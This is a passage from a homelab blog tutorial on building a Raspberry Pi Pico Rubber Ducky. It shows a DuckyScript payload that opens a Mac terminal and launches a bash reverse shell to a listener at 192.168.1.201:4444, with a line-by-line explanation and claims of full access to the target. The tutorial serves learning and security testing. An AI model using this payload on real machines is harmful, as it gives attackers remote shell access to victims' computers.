+STRING (bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.201/4444 0&gt;&amp;1' &amp;) &amp;&amp; exit
+DELAY 500
+ENTER
+DELAY 500
+GUI Q</code></pre><p>This script will open a terminal (assuming the target machine is a Mac), and then run the following command:</p><pre><code class="language-bash">(bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.1.201/4444 0&gt;&amp;1' &amp;) &amp;&amp; exit</code></pre><ul><li><code>bash -c '...'</code> : This part starts a new Bash shell and executes the command that follows.</li><li><code>bash -i</code> : This part starts an interactive Bash shell.</li><li><code>&gt;&amp; /dev/tcp/192.168.1.201/4444</code> : This part redirects the standard output and standard error to a TCP connection to the IP address <code>192.168.1.201</code> on port <code>4444</code>.</li><li><code>0&gt;&amp;1</code> : This part redirects the standard input to the standard output, allowing the TCP connection to receive inputs.</li><li><code>&amp;</code> : This part places the command in the background, allowing the script to continue running.</li><li><code>exit</code> : This part terminates the current shell.</li></ul><p>To sum up, this command creates an interactive shell in a new session, redirects it to our listening machine, then sends the process to the background so the terminal can be closed while still maintaining access to the shell.</p><p>Now, we can go back to our listening machine and check that we have successfully gained shell access to the target machine.</p><figure class="kg-card kg-image-card"><img src="../content/images/2025/05/Capture-d--cran-2025-05-23---23.07.06.png" class="kg-image" alt="" loading="lazy" width="880" height="370" srcset="../content/images/size/w600/2025/05/Capture-d--cran-2025-05-23---23.07.06.png 600w, ../content/images/2025/05/Capture-d--cran-2025-05-23---23.07.06.png 880w" sizes="(min-width: 720px) 720px"></figure><p>Once connected to the shell, we have full access to the target machine.</p><figure class="kg-card kg-image-card"><img src="../content/images/2025/05/Capture-d--cran-2025-05-23---23.08.04.png" class="kg-image" alt="" loading="lazy" width="880" height="370" srcset="../content/images/size/w600/2025/05/Capture-d--cran-2025-05-23---23.08.04.png 600w, ../content/images/2025/05/Capture-d--cran-2025-05-23---23.08.04.png 880w" sizes="(min-width: 720px) 720px"></figure><h2 id="conclusion">Conclusion</h2><p>In this article, we explored how to turn a Raspberry Pi Pico 2W into a functional Rubber Ducky. From installing CircuitPython and setting up the necessary libraries, to building a custom web interface and writing payloads in DuckyScript, we covered every step needed to launch automated keyboard-based attacks. We even demonstrated how to execute a basic script and went further with an advanced example: gaining a reverse shell on a target machine.<br>This project is a powerful example of how simple hardware can be used for both educational and cybersecurity testing purposes.</p><h2 id="credits">Credits</h2><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/majdsassi/Pico-WIFI-Duck/tree/main?ref=gianelli.net"><div class="kg-bookmark-content"><div class="kg-bookmark-title">GitHub - majdsassi/Pico-WIFI-Duck: Pico WiFi Duck is a project that enables the emulation of a USB Rubber Ducky over Wi-Fi using the Raspberry Pi Pico W. This functionality allows for remote control and automation of target systems, making it a versatile tool for penetration testing and security assessments.</div><div class="kg-bookmark-description">Pico WiFi Duck is a project that enables the emulation of a USB Rubber Ducky over Wi-Fi using the Raspberry Pi Pico W. This functionality allows for remote control and automation of target systems,…</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="../content/images/icon/pinned-octocat-093da3e6fa40-2.svg" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">majdsassi</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://opengraph.githubassets.com/73f44895307ca4da5296e52b2fa16cafaf2830b0b8cafd2ea2573174fb065711/majdsassi/Pico-WIFI-Duck" alt="" onerror="this.style.display = 'none'"></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://github.com/Neradoc/Circuitpython_Keyboard_Layouts/tree/main?ref=gianelli.net"><div class="kg-bookmark-content"><div class="kg-bookmark-title">GitHub - Neradoc/Circuitpython_Keyboard_Layouts: A repository of keyboard layouts for Circuitpython, for HID keyboards over USB or BLE.</div><div class="kg-bookmark-description">A repository of keyboard layouts for Circuitpython, for HID keyboards over USB or BLE. - Neradoc/Circuitpython_Keyboard_Layouts</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="../content/images/icon/pinned-octocat-093da3e6fa40-1.svg" alt=""><span class="kg-bookmark-author">GitHub</span><span class="kg-bookmark-publisher">Neradoc</span></div></div><div class="kg-bookmark-thumbnail"><img src="../content/images/thumbnail/Circuitpython_Keyboard_Layouts" alt="" onerror="this.style.display = 'none'"></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://docs.hak5.org/hak5-usb-rubber-ducky/duckyscript-tm-quick-reference?ref=gianelli.net"><div class="kg-bookmark-content"><div class="kg-bookmark-title">DuckyScript™ Quick Reference | USB Rubber Ducky</div><div class="kg-bookmark-description">DuckyScript™ is the programming language of the USB Rubber Ducky™, Hak5® hotplug attack gear and officially licensed devices (Trademark Hak5 LLC. Copyright © 2010 Hak5 LLC. All rights reserved.)</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="../content/images/icon/image" alt=""><span class="kg-bookmark-author">USB Rubber Ducky</span></div></div><div class="kg-bookmark-thumbnail"><img src="../content/images/thumbnail/image" alt="" onerror="this.style.display = 'none'"></div></a></figure>
+        </section>
+
+    </article>
+
+
+</main>
+
+
+            <section class="gh-container is-grid gh-outer">
+                <div class="gh-container-inner gh-inner">
+                    <h2 class="gh-container-title">Read more</h2>
+                    <div class="gh-feed">
+                            <article class="gh-card post">
+    <a class="gh-card-link" href="../automatic-upgrade-with-cron/index.html">
+            <figure class="gh-card-image">
+                <img
+                    srcset="../content/images/size/w160/format/webp/2025/03/affiche2.png 160w,
+                           ../content/images/size/w320/format/webp/2025/03/affiche2.png 320w,
+                          ../content/images/size/w600/format/webp/2025/03/affiche2.png 600w,
+                         ../content/images/size/w960/format/webp/2025/03/affiche2.png 960w,
+                        ../content/images/size/w1200/format/webp/2025/03/affiche2.png 1200w,
+                       ../content/images/size/w2000/format/webp/2025/03/affiche2.png 2000w"
+                    sizes="320px"
+                    src="../content/images/size/w600/2025/03/affiche2.png"
+                    alt="Automatic upgrades with CRON"
+                    loading="lazy"
+                >
+            </figure>
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">Automatic upgrades with CRON</h3>
+                    <p class="gh-card-excerpt is-body">Keeping your Linux system updated is important for security, stability, and performance. Updates fix security issues, improve speed, and prevent software conflicts. They also add new features and ensure everything runs smoothly. Regular updates keep your system safe and reliable.
+
+On Proxmox, it&#39;s important to keep both your</p>
+            <footer class="gh-card-meta">
+<!--
+             -->
+                    <span class="gh-card-author">By Thomas Gianelli</span>
+                    <time class="gh-card-date" datetime="2025-03-29">29 Mar 2025</time>
+                <!--
+         --></footer>
+        </div>
+    </a>
+</article>
+                            <article class="gh-card post">
+    <a class="gh-card-link" href="../vaultwarden/index.html">
+            <figure class="gh-card-image">
+                <img
+                    srcset="../content/images/size/w160/format/webp/2025/03/cover_article-2.png 160w,
+                           ../content/images/size/w320/format/webp/2025/03/cover_article-2.png 320w,
+                          ../content/images/size/w600/format/webp/2025/03/cover_article-2.png 600w,
+                         ../content/images/size/w960/format/webp/2025/03/cover_article-2.png 960w,
+                        ../content/images/size/w1200/format/webp/2025/03/cover_article-2.png 1200w,
+                       ../content/images/size/w2000/format/webp/2025/03/cover_article-2.png 2000w"
+                    sizes="320px"
+                    src="../content/images/size/w600/2025/03/cover_article-2.png"
+                    alt="Migration from Passwords (Apple) to Vaultwarden"
+                    loading="lazy"
+                >
+            </figure>
+        <div class="gh-card-wrapper">
+            <h3 class="gh-card-title is-title">Migration from Passwords (Apple) to Vaultwarden</h3>
+                    <p class="gh-card-excerpt is-body">I used to store and autofill my passwords using Apple&#39;s default application: Passwords. This application allows me to synchronize my passwords across my devices and is quite good. However, there are some drawbacks to using this application:
+
+ * If you are using a non-Apple device, you can&#39;t</p>
+            <footer class="gh-card-meta">
+<!--
+             -->
+                    <span class="gh-card-author">By Thomas Gianelli</span>
+                    <time class="gh-card-date" datetime="2025-03-22">22 Mar 2025</time>
+                <!--
+         --></footer>
+        </div>
+    </a>
+</article>
+                    </div>
+                </div>
+            </section>
+
+    
+    <footer class="gh-footer gh-outer">
+    <div class="gh-footer-inner gh-inner">
+
+        <div class="gh-footer-bar">
+            <span class="gh-footer-logo is-title">
+                    Gianelli HomeLab
+            </span>
+            <nav class="gh-footer-menu">
+                <ul class="nav">
+    <li class="nav-sign-up"><a href="index.html#/portal/">Sign up</a></li>
+</ul>
+
+            </nav>
+            <div class="gh-footer-copyright">
+                Powered by <a href="https://ghost.org/" target="_blank" rel="noopener">Ghost</a>
+            </div>
+        </div>
+
+                <section class="gh-footer-signup">
+                    <h2 class="gh-footer-signup-header is-title">
+                        Gianelli HomeLab
+                    </h2>
+                    <p class="gh-footer-signup-subhead is-body">
+                        
+                    </p>
+                    <form class="gh-form" data-members-form>
+    <input class="gh-form-input" id="footer-email" name="email" type="email" placeholder="jamie@example.com" required data-members-email>
+    <button class="gh-button" type="submit" aria-label="Subscribe">
+        <span><span>Subscribe</span> <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" fill="currentColor" viewBox="0 0 256 256"><path d="M224.49,136.49l-72,72a12,12,0,0,1-17-17L187,140H40a12,12,0,0,1,0-24H187L135.51,64.48a12,12,0,0,1,17-17l72,72A12,12,0,0,1,224.49,136.49Z"></path></svg></span>
+        <svg xmlns="http://www.w3.org/2000/svg" height="24" width="24" viewBox="0 0 24 24">
+    <g stroke-linecap="round" stroke-width="2" fill="currentColor" stroke="none" stroke-linejoin="round" class="nc-icon-wrapper">
+        <g class="nc-loop-dots-4-24-icon-o">
+            <circle cx="4" cy="12" r="3"></circle>
+            <circle cx="12" cy="12" r="3"></circle>
+            <circle cx="20" cy="12" r="3"></circle>
+        </g>
+        <style data-cap="butt">
+            .nc-loop-dots-4-24-icon-o{--animation-duration:0.8s}
+            .nc-loop-dots-4-24-icon-o *{opacity:.4;transform:scale(.75);animation:nc-loop-dots-4-anim var(--animation-duration) infinite}
+            .nc-loop-dots-4-24-icon-o :nth-child(1){transform-origin:4px 12px;animation-delay:-.3s;animation-delay:calc(var(--animation-duration)/-2.666)}
+            .nc-loop-dots-4-24-icon-o :nth-child(2){transform-origin:12px 12px;animation-delay:-.15s;animation-delay:calc(var(--animation-duration)/-5.333)}
+            .nc-loop-dots-4-24-icon-o :nth-child(3){transform-origin:20px 12px}
+            @keyframes nc-loop-dots-4-anim{0%,100%{opacity:.4;transform:scale(.75)}50%{opacity:1;transform:scale(1)}}
+        </style>
+    </g>
+</svg>        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+    <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+    <style>
+        .checkmark {
+            width: 40px;
+            height: 40px;
+            display: block;
+            stroke-width: 2.5;
+            stroke: currentColor;
+            stroke-miterlimit: 10;
+        }
+
+        .checkmark__check {
+            transform-origin: 50% 50%;
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            animation: stroke .3s cubic-bezier(0.650, 0.000, 0.450, 1.000) forwards;
+        }
+
+        @keyframes stroke {
+            100% { stroke-dashoffset: 0; }
+        }
+    </style>
+</svg>    </button>
+    <p data-members-error></p>
+</form>                </section>
+
+    </div>
+</footer>    
+</div>
+
+    <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <div class="pswp__bg"></div>
+
+    <div class="pswp__scroll-wrap">
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<script src="../assets/built/source.js%3Fv=8ba523071e"></script>
+
+  <script>
+    const progressBar = document.querySelector('.reading-progress');
+
+    function updateProgress() {
+      const totalHeight = document.body.clientHeight;
+      const windowHeight = document.documentElement.clientHeight;
+      const position = window.scrollY;
+      const progress = position / (totalHeight - windowHeight) * 100;
+      progressBar.setAttribute('value', progress);
+      requestAnimationFrame(updateProgress);
+    }
+
+    requestAnimationFrame(updateProgress);
+  </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.32.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        // Where to render the table of contents.
+        tocSelector: '.gh-toc',
+        // Where to grab the headings to build the table of contents.
+        contentSelector: '.gh-content',
+        // Which headings to grab inside of the contentSelector element.
+        headingSelector: 'h1, h2, h3, h4',
+        // Ensure correct positioning
+        hasInnerContainers: true,
+    });
+</script>
+
+
+</body>
+</html>
